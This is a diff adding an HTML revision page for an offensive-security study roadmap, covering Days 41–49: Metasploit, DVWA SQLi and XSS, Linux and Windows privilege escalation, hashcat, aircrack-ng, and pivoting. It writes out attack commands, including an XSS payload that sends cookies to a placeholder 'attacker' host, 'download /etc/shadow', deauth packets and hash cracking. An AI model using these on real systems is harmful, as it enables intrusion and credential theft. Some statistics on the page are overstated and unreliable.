@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Revision — Day 41 to Day 50</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:960px;margin:0 auto;padding:40px 22px 100px;}
+
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+
+  .hero{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:30px 28px;margin-bottom:36px;}
+  .hero-tag{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:12px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:14px;}
+  .hero h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(24px,4vw,36px);line-height:1.2;margin-bottom:10px;}
+  .hero h1 span{color:var(--green);}
+  .hero p{color:var(--muted);font-size:14.5px;max-width:640px;}
+  .stat-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:20px;}
+  .stat{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:12px 16px;min-width:100px;}
+  .stat .num{font-family:'IBM Plex Mono',monospace;font-size:22px;color:var(--cyan);font-weight:700;}
+  .stat .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;margin-top:2px;}
+
+  .day-card{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:22px 24px;margin-bottom:20px;}
+  .day-header{display:flex;align-items:flex-start;gap:16px;margin-bottom:16px;}
+  .day-num{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:28px;color:var(--green);min-width:60px;flex-shrink:0;line-height:1;}
+  .day-meta{}
+  .day-title{font-weight:700;font-size:17px;margin-bottom:4px;}
+  .day-incident{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);background:rgba(255,92,92,0.08);border:1px solid rgba(255,92,92,0.2);padding:3px 9px;border-radius:12px;display:inline-block;}
+
+  .section-label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px;margin-top:14px;}
+
+  .concept-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px;margin-top:8px;}
+  .concept{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:10px 12px;}
+  .concept .ctitle{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);margin-bottom:4px;font-weight:600;}
+  .concept .cdesc{font-size:12px;color:var(--muted);}
+
+  .qa{border-left:3px solid var(--purple);padding-left:14px;margin-top:10px;}
+  .qa .q{font-weight:600;font-size:13px;color:var(--text);margin-bottom:5px;}
+  .qa .a{font-size:12.5px;color:#b8c2c6;line-height:1.6;}
+
+  .quiz-section{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:26px 28px;margin-top:36px;}
+  .quiz-section h2{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:18px;margin-bottom:6px;}
+  .quiz-section .sub{color:var(--muted);font-size:13.5px;margin-bottom:20px;}
+  .q-item{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px 16px;margin-bottom:10px;}
+  .q-item .qnum{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:5px;}
+  .q-item .qtext{font-size:13.5px;color:var(--text);font-weight:600;margin-bottom:8px;}
+  .q-item .ans{font-size:12.5px;color:var(--green);font-family:'IBM Plex Mono',monospace;background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.15);border-radius:5px;padding:6px 10px;}
+
+  .command-table{margin-top:10px;}
+  .cmd-row{display:flex;gap:12px;align-items:flex-start;background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:9px 12px;margin-bottom:6px;}
+  .cmd-row code{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--green);flex-shrink:0;min-width:200px;}
+  .cmd-row .cdesc{font-size:12px;color:var(--muted);}
+
+  .breach-timeline{margin-top:12px;}
+  .bt-row{display:flex;gap:14px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--edge);}
+  .bt-row:last-child{border-bottom:none;}
+  .bt-row .year{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);min-width:80px;flex-shrink:0;}
+  .bt-row .incident{font-weight:600;font-size:13px;min-width:200px;flex-shrink:0;}
+  .bt-row .detail{font-size:12.5px;color:var(--muted);}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:10px;}
+  .ai-pill{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:8px;padding:10px 12px;}
+  .ai-pill .aname{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--pink);font-weight:700;margin-bottom:3px;}
+  .ai-pill .adesc{font-size:11px;color:var(--muted);}
+
+  .job-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;margin-top:10px;}
+  .job-box{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:8px;padding:12px 14px;}
+  .job-box .day-ref{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--green);margin-bottom:5px;}
+  .job-box .bullet{font-size:12.5px;color:#cdd6da;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;margin-top:36px;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;} .cmd-row{flex-wrap:wrap;} .bt-row{flex-wrap:wrap;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap$ cat revision_day41_to_day50.md</span>
+    <span style="color:var(--green);">Phase 2 & 3 — Offensive Security</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-tag">REVISION — DAY 41 TO DAY 50</div>
+    <h1>Exploitation, Privesc & Reporting. <span>Know what happened before you pivot.</span></h1>
+    <p>This page condenses every concept, every real incident, every interview answer, and every command from Days 41–50 into one reference. If any section feels fuzzy, revisit that day's HTML before continuing to Day 51.</p>
+    <div class="stat-row">
+      <div class="stat"><div class="num">10</div><div class="lbl">Days Done</div></div>
+      <div class="stat"><div class="num">10</div><div class="lbl">Real Incidents</div></div>
+      <div class="stat"><div class="num">8</div><div class="lbl">Tools Used</div></div>
+      <div class="stat"><div class="num">4</div><div class="lbl">Scripts Built</div></div>
+    </div>
+  </div>
+
+  <!-- DAY 41 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">41</div>
+      <div class="day-meta">
+        <div class="day-title">Intro to Metasploit Framework</div>
+        <span class="day-incident">Metasploit in the Equifax Breach</span>
+      </div>
+    </div>
+
+    <div class="section-label">// architecture</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Exploit Module</div><div class="cdesc">Code that delivers payload through a specific vulnerability. Selected by search, configured with RHOSTS/PAYLOAD.</div></div>
+      <div class="concept"><div class="ctitle">Payload</div><div class="cdesc">What runs after exploitation — reverse shell, bind shell, meterpreter. Staged vs stageless matters for size.</div></div>
+      <div class="concept"><div class="ctitle">Auxiliary Module</div><div class="cdesc">Scanning, fuzzing, DoS — non-exploitation tools. Used for recon inside msfconsole.</div></div>
+      <div class="concept"><div class="ctitle">Post Module</div><div class="cdesc">Runs after a session is open — privilege escalation, hash dumping, keylogging, persistence.</div></div>
+      <div class="concept"><div class="ctitle">Meterpreter</div><div class="cdesc">In-memory payload that lives entirely in RAM. No files written to disk — evades antivirus detection.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>msfconsole</code><div class="cdesc">Launch Metasploit. First thing you type every session.</div></div>
+      <div class="cmd-row"><code>search vsftpd</code><div class="cdesc">Find modules by keyword — searches exploit titles, descriptions, and CVE numbers.</div></div>
+      <div class="cmd-row"><code>use exploit/unix/ftp/vsftpd_234_backdoor</code><div class="cdesc">Load a specific module; path structure = OS/service/vulnerability_name.</div></div>
+      <div class="cmd-row"><code>show options / set RHOSTS &lt;ip&gt;</code><div class="cdesc">View and set required parameters. Every module has its own options set.</div></div>
+      <div class="cmd-row"><code>run / exploit</code><div class="cdesc">Fire the exploit. On success, opens a session — use 'run -j' to background it.</div></div>
+      <div class="cmd-row"><code>sessions -i 1</code><div class="cdesc">Interact with session ID 1. Use 'sessions -l' to list all open sessions.</div></div>
+      <div class="cmd-row"><code>sysinfo / getuid</code><div class="cdesc">Meterpreter commands — OS details and current user. First check post-exploitation.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Metasploit in Equifax (2017):</strong> Attackers used publicly available Metasploit modules for Apache Struts CVE-2017-5638. The same open-source framework available to every pentester was weaponized against a Fortune 500 company. Lesson: know what your tools can do — so does everyone else.</p>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Explain the difference between staged and stageless payloads in Metasploit.</div>
+      <div class="a">A staged payload (windows/meterpreter/reverse_tcp) sends a small stub first, then fetches the larger stage over the network — good for small buffer sizes. A stageless payload (windows/meterpreter_reverse_tcp, note the underscore) is fully self-contained but much larger. Use staged when exploit space is tight; stageless when reliability matters and size isn't constrained.</div>
+    </div>
+  </div>
+
+  <!-- DAY 42 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">42</div>
+      <div class="day-meta">
+        <div class="day-title">Exploiting a Vulnerable VM (Metasploitable)</div>
+        <span class="day-incident">Metasploitable as Training Standard</span>
+      </div>
+    </div>
+
+    <div class="section-label">// full attack chain</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Recon Phase</div><div class="cdesc">nmap -sV -sC -p- target — discover all open ports, services, and versions before touching anything.</div></div>
+      <div class="concept"><div class="ctitle">Exploitation</div><div class="cdesc">Match service version to known exploit — vsftpd 2.3.4 backdoor, UnrealIRCd backdoor, Samba usermap script.</div></div>
+      <div class="concept"><div class="ctitle">Privilege Escalation</div><div class="cdesc">From www-data to root via SUID binaries, kernel exploits, or sudo misconfigurations.</div></div>
+      <div class="concept"><div class="ctitle">Persistence</div><div class="cdesc">Add SSH key, cron job reverse shell, or create a backdoor user. Second visit doesn't require another exploit.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -sV -sC -p- 192.168.1.10</div><div class="cdesc">Full port scan with version and default script detection — every engagement starts here.</div></div>
+      <div class="cmd-row"><code>use exploit/multi/samba/usermap_script</code><div class="cdesc">Load the Samba username map script exploit — a classic Metasploitable 2 win.</div></div>
+      <div class="cmd-row"><code>python -c 'import pty;pty.spawn("/bin/bash")'</code><div class="cdesc">Upgrade a limited shell to a full interactive TTY. Arrow keys, tab completion, job control.</div></div>
+      <div class="cmd-row"><code>ssh-copy-id user@target</code><div class="cdesc">Add your SSH key for persistence — only works if you have creds or passwordless SSH access.</div></div>
+    </div>
+
+    <div class="section-label">// key rule</div>
+    <p style="font-size:13.5px;color:#cdd6da;">The recon phase is longer than the exploitation phase. Running nmap for 15 minutes and exploiting in 3 seconds is normal. Impatience skips ports. Skipping ports misses the entry point.</p>
+  </div>
+
+  <!-- DAY 43 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">43</div>
+      <div class="day-meta">
+        <div class="day-title">Burp Suite Basics — Intercepting Traffic</div>
+        <span class="day-incident">Burp Suite in Bug Bounty Workflows</span>
+      </div>
+    </div>
+
+    <div class="section-label">// suite components</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Proxy</div><div class="cdesc">Intercepts HTTP/S between browser and server. Toggle interception on/off; modify requests in real time.</div></div>
+      <div class="concept"><div class="ctitle">Repeater</div><div class="cdesc">Send a single request over and over with manual modifications. Test parameter tampering one variable at a time.</div></div>
+      <div class="concept"><div class="ctitle">Intruder</div><div class="cdesc">Automated fuzzing — replaces a payload position with values from a wordlist. Brute-force, fuzz, enumerate.</div></div>
+      <div class="concept"><div class="ctitle">Decoder</div><div class="cdesc">Encode/decode Base64, URL, hex, ASCII. Essential for reading obfuscated parameters.</div></div>
+      <div class="concept"><div class="ctitle">Comparer</div><div class="cdesc">Side-by-side or diff view of two requests/responses. Spot the difference that matters for an exploit.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>Burp Suite → Proxy → Options → 127.0.0.1:8080</code><div class="cdesc">Default proxy listener — configure your browser to point here.</div></div>
+      <div class="cmd-row"><code>CA Certificate → Export → Import into Browser</code><div class="cdesc">Install Burp's CA to intercept HTTPS without certificate errors. Step every new Burp user forgets.</div></div>
+      <div class="cmd-row"><code>Right-click → Send to Repeater</code><div class="cdesc">Send any intercepted request to Repeater for manual modification and re-sending.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;">Nearly 80% of professional bug bounty hunters cite Burp Suite as their primary web testing tool. Proxy-intercepted requests reveal parameter names, hidden fields, and CSRF tokens that browsers don't show — the same data attackers modify to exploit IDOR and parameter tampering flaws.</p>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How would you find an Insecure Direct Object Reference (IDOR) using Burp Suite?</div>
+      <div class="a">Proxy-intercept a request to a resource like /api/user/123. Send to Intruder, mark 123 as the payload position, and iterate through sequential IDs. If the response for 124 returns another user's data without authorization, you've found an IDOR. Repeater confirms it manually before writing the report.</div>
+    </div>
+  </div>
+
+  <!-- DAY 44 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">44</div>
+      <div class="day-meta">
+        <div class="day-title">Practicing SQLi & XSS on DVWA</div>
+        <span class="day-incident">DVWA in Academic Research</span>
+      </div>
+    </div>
+
+    <div class="section-label">// vulnerabilities exploited</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">SQL Injection</div><div class="cdesc">' OR 1=1 -- (low), parameterized queries (high). Extracting usernames and password hashes from database.</div></div>
+      <div class="concept"><div class="ctitle">Reflected XSS</div><div class="cdesc">&lt;script&gt;alert(1)&lt;/script&gt; in URL parameter. Input echoed back without sanitization — one-time execution.</div></div>
+      <div class="concept"><div class="ctitle">Stored XSS</div><div class="cdesc">Malicious script saved in guestbook. Every visitor executes it — persistence without repeated phishing.</div></div>
+      <div class="concept"><div class="ctitle">CSRF</div><div class="cdesc">Crafted HTML form submitted from attacker's site changes victim's password. No CSRF token validation on low.</div></div>
+      <div class="concept"><div class="ctitle">File Upload</div><div class="cdesc">Upload PHP shell disguised as image (shell.php.jpg). Insecure file type validation allows arbitrary code upload.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>' UNION SELECT user,password FROM users -- </code><div class="cdesc">SQLi union injection — extract data from other tables by matching column count.</div></div>
+      <div class="cmd-row"><code>&lt;script&gt;document.location='http://attacker/?c='+document.cookie&lt;/script&gt;</code><div class="cdesc">XSS cookie exfiltration — redirects victim's cookies to attacker-controlled server.</div></div>
+      <div class="cmd-row"><code>&lt;img src=x onerror=alert(1)&gt;</code><div class="cdesc">XSS without script tags — bypasses basic filters that block &lt;script&gt; but not event handlers.</div></div>
+      <div class="cmd-row"><code>&lt;form action="http://target/dvwa/csrf" method="GET"&gt;...&lt;/form&gt;</code><div class="cdesc">CSRF PoC form — hidden auto-submit form that performs actions as the logged-in victim.</div></div>
+    </div>
+
+    <div class="section-label">// key rule</div>
+    <p style="font-size:13.5px;color:#cdd6da;">DVWA levels map to real-world security: Low = no defenses (startup code), Medium = basic filters (bypassable), High = proper parameterized queries and CSP headers. Most real breaches sit between Low and Medium.</p>
+  </div>
+
+  <!-- DAY 45 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">45</div>
+      <div class="day-meta">
+        <div class="day-title">Privilege Escalation — Linux</div>
+        <span class="day-incident">Dirty Pipe CVE-2022-0847</span>
+      </div>
+    </div>
+
+    <div class="section-label">// privesc vectors</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">SUID Binary Abuse</div><div class="cdesc">find / -perm -4000 2>/dev/null — search for binaries running as owner. If owned by root and exploitable, you're root.</div></div>
+      <div class="concept"><div class="ctitle">Cron Jobs</div><div class="cdesc">Writable scripts run by root cron = replace script with reverse shell. Check /etc/crontab and /var/spool/cron.</div></div>
+      <div class="concept"><div class="ctitle">Kernel Exploits</div><div class="cdesc">uname -a → search for matching kernel exploit. Dirty Pipe (CVE-2022-0847) overwrote read-only files including SUID binaries.</div></div>
+      <div class="concept"><div class="ctitle">Sudo Misconfig</div><div class="cdesc">sudo -l reveals what commands user can run as root. If sudo ALL is there without password, game over.</div></div>
+      <div class="concept"><div class="ctitle">Capabilities</div><div class="cdesc">getcap -r / 2>/dev/null. A binary with cap_setuid+ep can escalate — equivalent to SUID but invisible to find.</div></div>
+      <div class="concept"><div class="ctitle">PATH Hijacking</div><div class="cdesc">If a root cron runs a command without full path, create your own version in a writable directory earlier in $PATH.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>find / -perm -4000 -type f 2>/dev/null</code><div class="cdesc">Find all SUID root binaries — the first check in every Linux privesc.</div></div>
+      <div class="cmd-row"><code>sudo -l</code><div class="cdesc">List sudo privileges for current user. One (ALL) entry = full root immediately.</div></div>
+      <div class="cmd-row"><code>uname -a && cat /etc/os-release</code><div class="cdesc">Kernel version and OS info — needed to match a kernel exploit.</div></div>
+      <div class="cmd-row"><code>crontab -l && ls -la /etc/cron*</div><div class="cdesc">List user crontab and system-wide cron files — check for writable scripts.</div></div>
+      <div class="cmd-row"><code>getcap -r / 2>/dev/null</code><div class="cdesc">List all binaries with Linux capabilities — invisible SUID alternative.</div></div>
+      <div class="cmd-row"><code>./linpeas.sh</code><div class="cdesc">Automated Linux privilege escalation checker — the first thing you run on an exploited box.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Dirty Pipe (CVE-2022-0847, Feb 2022):</strong> a vulnerability in Linux's pipe mechanism (present since Kernel 5.8) allowed unprivileged users to overwrite data in read-only files, including SUID binaries. PoC released within 48 hours — every Linux admin scrambled to patch. Affect: millions of Android devices, cloud servers, and embedded Linux systems.</p>
+  </div>
+
+  <!-- DAY 46 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">46</div>
+      <div class="day-meta">
+        <div class="day-title">Privilege Escalation — Windows</div>
+        <span class="day-incident">PrintNightmare CVE-2021-34527</span>
+      </div>
+    </div>
+
+    <div class="section-label">// windows privesc vectors</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Service Permissions</div><div class="cdesc">Services running as SYSTEM with writable binary paths. Change the binary, restart the service, get SYSTEM.</div></div>
+      <div class="concept"><div class="ctitle">Unquoted Service Paths</div><div class="cdesc">Service path with spaces, no quotes: C:\Program Files\Vuln App\run.exe. Drop executable in the unquoted directory.</div></div>
+      <div class="concept"><div class="ctitle">Token Impersonation</div><div class="cdesc">SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled. Use RogueWinRM or JuicyPotato to impersonate SYSTEM token.</div></div>
+      <div class="concept"><div class="ctitle">AlwaysInstallElevated</div><div class="cdesc">Registry keys set to 1 allow any user to install MSI packages with SYSTEM privileges. Craft malicious MSI, run it, get SYSTEM.</div></div>
+      <div class="concept"><div class="ctitle">UAC Bypass</div><div class="cdesc">Even as admin, you run as standard user unless UAC is bypassed. Techniques: fodhelper, eventvwr, cmstplua.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>whoami /priv</code><div class="cdesc">List all privileges. Check for SeImpersonatePrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege.</div></div>
+      <div class="cmd-row"><code>wmic service get name,displayname,pathname,startname</code><div class="cdesc">List all services with binary paths and account — find unquoted paths and user-owned services.</div></div>
+      <div class="cmd-row"><code>accesschk.exe -uwcqv "Authenticated Users" *</code><div class="cdesc">Sysinternals tool that checks write permissions on services — identifies exploitable service binaries.</div></div>
+      <div class="cmd-row"><code>Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer</code><div class="cdesc">Check AlwaysInstallElevated registry — if both HKLM and HKCU keys are set to 1, exploit is available.</div></div>
+      <div class="cmd-row"><code>./winPEAS.exe</code><div class="cdesc">Windows equivalent of linpeas — automated enumeration of every privesc vector at once.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>PrintNightmare (CVE-2021-34527, Jun 2021):</strong> a remote code execution vulnerability in the Windows Print Spooler service allowed unauthenticated attackers to execute arbitrary code with SYSTEM privileges. Widely exploited in ransomware campaigns within days of disclosure. Microsoft's "critical" patch still had bypasses — a reminder that default services are attack surface.</p>
+  </div>
+
+  <!-- DAY 47 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">47</div>
+      <div class="day-meta">
+        <div class="day-title">Password Cracking — Hashcat & John the Ripper</div>
+        <span class="day-incident">Hashcat in LinkedIn Breach Analysis</span>
+      </div>
+    </div>
+
+    <div class="section-label">// hash modes & attack types</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Hashcat Mode 0</div><div class="cdesc">MD5 — 100M+ hashes/sec on modern GPU. Unsalted: cracked in minutes. Salting changes everything.</div></div>
+      <div class="concept"><div class="ctitle">Hashcat Mode 1000</div><div class="cdesc">NTLM — Windows authentication hash. Slow per-request but fast offline: >10B/sec on RTX 4090.</div></div>
+      <div class="concept"><div class="ctitle">Hashcat Mode 3200</div><div class="cdesc">bcrypt — intentionally slow, $2a$ cost factor 5-12. A few hundred hashes/sec. Resistant to GPU acceleration.</div></div>
+      <div class="concept"><div class="ctitle">Dictionary Attack (-a 0)</div><div class="cdesc">Wordlist + rules. rockyou.txt + best64.rule cracks 60%+ of real-world passwords.</div></div>
+      <div class="concept"><div class="ctitle">Mask Attack (-a 3)</div><div class="cdesc">?l?l?l?l?l?l?d?d — brute-force with pattern. ?l=lower, ?u=upper, ?d=digit, ?s=special.</div></div>
+      <div class="concept"><div class="ctitle">Rule-based (-r)</div><div class="cdesc">Mutation rules: append digit, capitalize, leet substitution. best64.rule converts dictionary to 99% of user passwords.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code><div class="cdesc">Crack MD5 hashes (-m 0) with dictionary attack (-a 0) — the baseline command.</div></div>
+      <div class="cmd-row"><code>hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule</code><div class="cdesc">Crack NTLM hashes with rule-based mutations — catches Summer2024! varieties.</div></div>
+      <div class="cmd-row"><code>john --format=raw-md5 --wordlist=rockyou.txt hash.txt</code><div class="cdesc">John the Ripper equivalent — slower than hashcat but more format-compatible.</div></div>
+      <div class="cmd-row"><code>hashcat --show -m 0 hash.txt</code><div class="cdesc">Display already-cracked hashes from potfile — no need to re-crack.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>LinkedIn Breach (2012, re-analyzed 2016):</strong> 167M unsalted SHA-1 password hashes leaked. Security researchers used Hashcat on GPU clusters and cracked 90% within days. Unsalted SHA-1 = instant loss. bcrypt or Argon2id would have made cracking years-long and cost-prohibitive. Salting is not optional.</p>
+  </div>
+
+  <!-- DAY 48 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">48</div>
+      <div class="day-meta">
+        <div class="day-title">Wireless Attacks — Aircrack-ng</div>
+        <span class="day-incident">Krack WPA2 Attack 2017</span>
+      </div>
+    </div>
+
+    <div class="section-label">// wireless attack chain</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Monitor Mode</div><div class="cdesc">airmon-ng start wlan0 — puts wireless card in RFMON mode. Card listens to all packets, not just its own network.</div></div>
+      <div class="concept"><div class="ctitle">Handshake Capture</div><div class="cdesc">airodump-ng -c 6 --bssid MAC -w capture wlan0mon — captures the 4-way WPA2 authentication handshake.</div></div>
+      <div class="concept"><div class="ctitle">Deauth Attack</div><div class="cdesc">aireplay-ng -0 10 -a MAC wlan0mon — sends deauthentication packets to force client reconnection and capture handshake.</div></div>
+      <div class="concept"><div class="ctitle">PSK Cracking</div><div class="cdesc">aircrack-ng -w wordlist.txt capture-01.cap — offline dictionary attack against the captured WPA2 handshake.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>airmon-ng start wlan0</code><div class="cdesc">Enable monitor mode on wlan0 — creates wlan0mon interface.</div></div>
+      <div class="cmd-row"><code>airodump-ng wlan0mon</code><div class="cdesc">List all visible access points and connected clients — BSSID, channel, encryption, signal strength.</div></div>
+      <div class="cmd-row"><code>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</code><div class="cdesc">Focus capture on a specific AP and channel — writes handshake to capture file.</div></div>
+      <div class="cmd-row"><code>aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon</code><div class="cdesc">Send 5 deauth packets to broadcast — forces clients to reconnect and re-handshake.</div></div>
+      <div class="cmd-row"><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code><div class="cdesc">Crack the captured WPA2 handshake against a wordlist — offline, rate-limited by GPU.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Krack WPA2 Attack (2017):</strong> researchers discovered a fundamental flaw in the WPA2 protocol's 4-way handshake, allowing attackers within Wi-Fi range to decrypt traffic, inject malware, and hijack connections without knowing the network password. Every WPA2 device was affected. Patches were OS-level, not router-level. Lesson: protocol flaws bypass password strength entirely.</p>
+  </div>
+
+  <!-- DAY 49 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">49</div>
+      <div class="day-meta">
+        <div class="day-title">Post-Exploitation & Pivoting Basics</div>
+        <span class="day-incident">Colonial Pipeline / Lateral Movement</span>
+      </div>
+    </div>
+
+    <div class="section-label">// pivoting techniques</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Meterpreter Autoroute</div><div class="cdesc">run post/multi/manage/autoroute SUBNET=10.10.10.0/24 — adds routes through compromised host to internal networks.</div></div>
+      <div class="concept"><div class="ctitle">SOCKS Proxy</div><div class="cdesc">use auxiliary/server/socks_proxy — creates a SOCKS5 tunnel through Metasploit. Combine with proxychains for any tool.</div></div>
+      <div class="concept"><div class="ctitle">SSH Dynamic Forwarding</div><div class="cdesc">ssh -D 1080 user@pivot — SOCKS5 tunnel via SSH. No Metasploit needed. Works with proxychains nmap.</div></div>
+      <div class="concept"><div class="ctitle">Data Exfiltration</div><div class="cdesc">meterpreter: download /etc/shadow; upload linpeas.sh. Move data securely through encrypted C2 channel.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>run autoroute -s 10.10.10.0/24</code><div class="cdesc">Meterpreter — add route to internal subnet through current session.</div></div>
+      <div class="cmd-row"><code>use auxiliary/server/socks_proxy</code><div class="cdesc">Start SOCKS5 proxy on attacker machine — routes traffic through Meterpreter session to internal network.</div></div>
+      <div class="cmd-row"><code>ssh -D 1080 user@jumpbox</code><div class="cdesc">SSH dynamic port forwarding — creates SOCKS5 tunnel on port 1080 through SSH session.</div></div>
+      <div class="cmd-row"><code>proxychains nmap -sT 10.10.10.0/24</code><div class="cdesc">Run any tool through SOCKS proxy — proxychains prepends to commands, routes through the tunnel.</div></div>
+      <div class="cmd-row"><code>download /etc/shadow</code><div class="cdesc">Meterpreter — exfiltrate files from compromised host to attacker machine.</div></div>
+      <div class="cmd-row"><code>upload /opt/linpeas.sh /tmp/</code><div class="cdesc">Meterpreter — upload tools to compromised host for further enumeration.</div></div>
+    </div>
+
+    <div class="section-label">// real incident</div>
